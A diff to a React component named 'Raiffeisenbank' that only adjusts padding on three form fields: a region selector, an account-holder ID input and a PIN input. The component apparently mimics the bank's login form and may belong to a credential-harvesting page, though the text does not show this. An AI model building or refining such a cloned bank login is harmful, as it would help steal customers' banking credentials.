@@ -144,7 +144,7 @@ const Raiffeisenbank = () => {
           <div
             onClick={() => setSelectOpen(!selectOpen)}
             onBlur={() => setBundeslandTouched(true)}
-            className={`w-full cursor-pointer border-b-2 px-3 pb-1 pt-5 text-base text-[#1a1a1a] outline-none ${
+            className={`w-full cursor-pointer border-b-2 px-3 pb-3 pt-3 text-base text-[#1a1a1a] outline-none ${
               selectOpen ? "border-[#fbf315] bg-[#e8e8e8]" : bundeslandTouched && !bundesland ? "border-red-600 bg-[#f4f4f4]" : "border-[#1a1a1a] bg-[#f4f4f4]"
             }`}
           >
@@ -203,7 +203,7 @@ const Raiffeisenbank = () => {
             onChange={(e) => setVerfueger(e.target.value)}
             onBlur={() => setVerfuegerTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-3 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
               verfuegerTouched && !verfueger ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
@@ -229,7 +229,7 @@ const Raiffeisenbank = () => {
             onChange={(e) => setPin(e.target.value)}
             onBlur={() => setPinTouched(true)}
             placeholder=" "
-            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-1 pt-5 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
+            className={`peer w-full border-b-2 bg-[#f4f4f4] px-3 pb-3 pt-3 text-base text-[#1a1a1a] outline-none focus:border-[#fbf315] focus:bg-[#e8e8e8] ${
               pinTouched && !pin ? "border-red-600" : "border-[#1a1a1a]"
             }`}
           />
